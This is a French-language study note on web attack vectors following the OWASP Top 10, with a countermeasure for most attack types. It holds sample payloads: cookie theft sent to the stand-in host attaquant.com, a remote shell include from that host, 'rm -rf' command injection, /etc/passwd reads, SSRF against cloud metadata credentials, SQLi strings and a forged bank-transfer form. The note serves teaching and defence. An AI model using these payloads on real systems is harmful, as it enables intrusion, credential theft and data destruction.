---
title: "Vecteurs d'attaque Web"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Web Security"
tags: [sciences-appliquées, informatique, sécurité]
date: "2024-11-01"
---

# Vecteurs d'attaque Web

Les vecteurs d'attaque web sont les chemins empruntés par un attaquant pour compromettre une application. Cette note couvre les catégories majeures de l'OWASP Top 10 et les techniques associées.

## Injections

### SQL Injection

L'injection SQL survient quand une entrée utilisateur est insérée directement dans une requête SQL sans validation ni paramétrage.

```sql
-- Requête vulnérable
SELECT * FROM users WHERE username = '$user' AND password = '$pass'

-- Entrée malveillante : username = admin'--
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
-- Le -- commente le reste : la vérification du mot de passe est annulée

-- Union-based injection : exfiltrer d'autres données
' UNION SELECT username, password, null FROM users--

-- Blind injection (boolean-based) : inférer bit par bit
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

**Contre-mesures :** requêtes paramétrées (prepared statements), ORM, validation stricte des entrées, principe du moindre privilège sur le compte DB.

### Command Injection

```python
# Vulnérable : l'entrée utilisateur est passée au shell
import os
filename = request.args.get("file")
os.system(f"cat {filename}")

# Entrée malveillante : ?file=notes.txt; rm -rf /var/www
# Exécute : cat notes.txt; rm -rf /var/www
```

**Contre-mesures :** éviter les fonctions shell, utiliser des APIs de haut niveau, valider et blanchir les entrées.

### LDAP Injection

```
# Requête vulnérable
(&(uid=$user)(userPassword=$pass))

# Entrée : user = *)(uid=*))(|(uid=*
# Résultat : authentification contournée
```

### XXE (XML External Entity)

```xml
<!-- Fichier XML malveillant envoyé au serveur -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
<!-- Le serveur inclut le contenu de /etc/passwd dans sa réponse -->
```

**Contre-mesures :** désactiver le traitement des entités externes dans le parseur XML, utiliser JSON si possible.

## XSS (Cross-Site Scripting)

Le XSS injecte du code JavaScript dans une page web vue par d'autres utilisateurs.

### XSS Réfléchi (reflected)

Le payload est dans la requête HTTP et réfléchi dans la réponse.

```
URL malveillante :
https://site.com/recherche?q=<script>document.location='https://attaquant.com/steal?c='+document.cookie</script>

Si le site affiche : Résultats pour "<script>...</script>"
→ le script est exécuté dans le navigateur de la victime
```

### XSS Stocké (persistent)

Le payload est sauvegardé en base de données et servi à tous les utilisateurs qui consultent la page infectée (champs de commentaire, profil, etc.).

### XSS basé sur le DOM

La manipulation se fait côté client sans aller jusqu'au serveur.

```javascript
// Code vulnérable
document.getElementById("bienvenue").innerHTML = location.hash.substring(1);

// URL malveillante
https://site.com/#<img src=x onerror="vol_cookies()">
```

**Contre-mesures :** encoder les sorties HTML (`&lt;`, `&gt;`, etc.), utiliser `textContent` au lieu de `innerHTML`, Content Security Policy (CSP), HttpOnly sur les cookies.

## CSRF (Cross-Site Request Forgery)

Un site malveillant force le navigateur d'une victime authentifiée à envoyer une requête à un autre site.

```html
<!-- Page malveillante visitée par la victime -->
<img src="https://banque.com/virement?montant=1000&dest=attaquant" />
<!-- Si la victime est authentifiée sur banque.com, la requête est exécutée -->

<!-- Formulaire silencieux -->
<form action="https://banque.com/virement" method="POST" id="f">
  <input name="montant" value="1000">
  <input name="dest" value="attaquant">
</form>
<script>document.getElementById("f").submit();</script>
```

**Contre-mesures :** tokens CSRF (synchronizer token pattern), cookie `SameSite=Strict`, vérification de l'en-tête `Origin`/`Referer`.

## SSRF (Server-Side Request Forgery)

L'attaquant fait envoyer des requêtes par le serveur vers des ressources internes.

```
# Paramètre vulnérable : le serveur récupère une URL fournie par l'utilisateur
POST /api/fetch
{"url": "https://service-externe.com/image.jpg"}

# Exploitation : accéder à des services internes
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# (métadonnées AWS EC2 — récupère les credentials IAM)

{"url": "http://localhost:6379/"}
# Tente d'accéder à Redis local

{"url": "file:///etc/passwd"}
# Lit des fichiers locaux via le schéma file://
```

**Contre-mesures :** liste blanche des domaines autorisés, bloquer les IPs privées et metadata endpoints, désactiver les schémas non-HTTP.

## Path Traversal / LFI / RFI

### Path Traversal

```
# Paramètre vulnérable
https://site.com/fichier?nom=rapport.pdf

# Exploitation
https://site.com/fichier?nom=../../../../etc/passwd
https://site.com/fichier?nom=..%2F..%2F..%2Fetc%2Fpasswd  (URL encodé)
```

### Local File Inclusion (LFI)

```php
// Code PHP vulnérable
include($_GET['page'] . '.php');

// Exploitation
?page=../../../../etc/passwd%00   (null byte pour tronquer l'extension)
?page=php://filter/convert.base64-encode/resource=config   (lire config.php en base64)
```

### Remote File Inclusion (RFI)

```
// include() charge un fichier distant si allow_url_include est activé
?page=https://attaquant.com/shell.php
```

**Contre-mesures :** validation des chemins, utiliser des listes blanches, `realpath()` pour résoudre les chemins, `chroot`.

## IDOR (Insecure Direct Object Reference)

L'application expose des références directes à des objets internes sans vérifier les autorisations.

```
# Accès à sa propre facture
GET /api/factures/1042

# Modification de l'ID → accès à la facture d'un autre utilisateur
GET /api/factures/1043
GET /api/factures/1044
```

**Contre-mesures :** vérifier les autorisations à chaque accès (ne pas se fier à la session seule), utiliser des identifiants opaques (UUID plutôt que des IDs séquentiels).

## Broken Authentication

- Sessions dont l'identifiant est prévisible ou ne change pas après connexion
- Tokens JWT avec algorithme `none` ou signature mal vérifiée
- Mots de passe stockés en clair ou hachés sans sel (MD5, SHA1 non appropriés)
- Absence de protection contre le brute-force

```python
# JWT avec alg=none (contournement de signature)
header = base64url_encode('{"alg":"none","typ":"JWT"}')
payload = base64url_encode('{"user":"admin","role":"admin"}')
token = f"{header}.{payload}."  # signature vide — acceptée par certaines implémentations
```

**Contre-mesures :** `bcrypt`/`argon2` pour les mots de passe, régénérer les sessions à la connexion, MFA, limiter les tentatives.

## Security Misconfiguration

- Services de débogage en production (stack traces, console admin)
- Credentials par défaut non changés
- Répertoires listables (directory listing)
- En-têtes de sécurité absents

```
# Réponse révélatrice (information disclosure)
HTTP/1.1 500 Internal Server Error
X-Powered-By: PHP/7.3.8
Server: Apache/2.4.41

# Réponse sécurisée : minimiser les informations de version
Server: Apache
```

**Contre-mesures :** désactiver les fonctionnalités inutilisées, configurer les en-têtes de sécurité (CSP, HSTS, X-Content-Type-Options), supprimer les pages d'erreur détaillées, scanner régulièrement avec des outils comme Nikto ou OWASP ZAP.

## Résumé OWASP Top 10 (2021)

| Rang | Catégorie | Exemples |
|---|---|---|
| A01 | Broken Access Control | IDOR, path traversal, privilege escalation |
| A02 | Cryptographic Failures | Données sensibles en clair, algorithmes faibles |
| A03 | Injection | SQLi, Command injection, XXE |
| A04 | Insecure Design | Absence de modèles de menaces dès la conception |
| A05 | Security Misconfiguration | Permissions, credentials par défaut, headers |
| A06 | Vulnerable Components | Dépendances obsolètes avec CVEs connues |
| A07 | Auth & Session Failures | Gestion de sessions, mots de passe faibles |
| A08 | Software Integrity Failures | Pipelines CI/CD non sécurisés, supply chain |
| A09 | Logging & Monitoring Failures | Absence de détection d'incidents |
| A10 | SSRF | Requêtes vers ressources internes |

## Outils de test

| Outil | Usage |
|---|---|
| Burp Suite | Proxy, scanner, exploitation manuelle |
| OWASP ZAP | Scanner automatique open-source |
| sqlmap | Automatisation des injections SQL |
| XSSer / Dalfox | Détection de XSS |
| Nikto | Scan de serveurs web (misconfigurations) |
| ffuf / gobuster | Fuzzing de répertoires et paramètres |
| nuclei | Scanner de vulnérabilités basé sur templates |
